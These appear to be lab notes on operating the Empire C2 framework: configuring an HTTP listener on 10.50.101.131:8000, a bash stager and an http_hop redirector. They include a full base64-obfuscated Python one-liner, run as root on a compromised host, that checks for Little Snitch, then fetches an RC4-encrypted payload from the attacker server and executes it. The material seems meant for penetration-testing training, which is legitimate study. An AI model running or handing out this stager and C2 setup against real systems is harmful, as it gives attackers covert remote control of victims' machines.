### set up *listener*

`uselistener http`

We then set our options for the listener

```
set Name Webserver
set Host 10.50.101.131
set Port 8000
```

Now we can run the listener with `execute` and go `back`

---

### set up *stager*

`usestager multi/bash`

set listener to the one we created earlier
`set Listener Webserver`

`execute` again

---

### combine the *listener* and *stager* into an *agent*

We log back into the .200 box first as root, then we run the following command:

```bash
echo "import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUsIHN0ZGVycj1zdWJwcm9jZXNzLlBJUEUpCm91dCwgZXJyID0gcHMuY29tbXVuaWNhdGUoKQppZiByZS5zZWFyY2goIkxpdHRsZSBTbml0Y2giLCBvdXQuZGVjb2RlKCdVVEYtOCcpKToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliLnJlcXVlc3Q7ClVBPSdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjE7IFdPVzY0OyBUcmlkZW50LzcuMDsgcnY6MTEuMCkgbGlrZSBHZWNrbyc7c2VydmVyPSdodHRwOi8vMTAuNTAuMTAxLjEzMTo4MDAwJzt0PScvbmV3cy5waHAnO3JlcT11cmxsaWIucmVxdWVzdC5SZXF1ZXN0KHNlcnZlcit0KTsKcHJveHkgPSB1cmxsaWIucmVxdWVzdC5Qcm94eUhhbmRsZXIoKTsKbyA9IHVybGxpYi5yZXF1ZXN0LmJ1aWxkX29wZW5lcihwcm94eSk7Cm8uYWRkaGVhZGVycz1bKCdVc2VyLUFnZW50JyxVQSksICgiQ29va2llIiwgInNlc3Npb249K3Nud0l3b1pWb2NXOVpuaCtjR3FKRU5BdjRzPSIpXTsKdXJsbGliLnJlcXVlc3QuaW5zdGFsbF9vcGVuZXIobyk7CmE9dXJsbGliLnJlcXVlc3QudXJsb3BlbihyZXEpLnJlYWQoKTsKSVY9YVswOjRdO2RhdGE9YVs0Ol07a2V5PUlWKyc1SXZMZypDQlp9XWJoUlkvN0VkY1t+TShfIztqTm0hLCcuZW5jb2RlKCdVVEYtOCcpO1MsaixvdXQ9bGlzdChyYW5nZSgyNTYpKSwwLFtdCmZvciBpIGluIGxpc3QocmFuZ2UoMjU2KSk6CiAgICBqPShqK1NbaV0ra2V5W2klbGVuKGtleSldKSUyNTYKICAgIFNbaV0sU1tqXT1TW2pdLFNbaV0KaT1qPTAKZm9yIGNoYXIgaW4gZGF0YToKICAgIGk9KGkrMSklMjU2CiAgICBqPShqK1NbaV0pJTI1NgogICAgU1tpXSxTW2pdPVNbal0sU1tpXQogICAgb3V0LmFwcGVuZChjaHIoY2hhcl5TWyhTW2ldK1Nbal0pJTI1Nl0pKQpleGVjKCcnLmpvaW4ob3V0KSk='));" | python3 &
```

This will result in an agent being received on our waiting listener in Empire. We can then type `agents` to view

We interact with the agent with `interact AGENTNAME`

(we can kill the agent with `kill AGENTNAME` or rename it with `rename AGENTNAME NEWNAME`)

---

### Proxying Empire agents

We will want to `uselistener http_hop`

Set the following
```
set RedirectListener Webserver
set Host 10.200.100.200
set Port 47000
```

---

Now we generate a new stager

`usestager multi/launcher`
`set Listener http_hop`
`execute`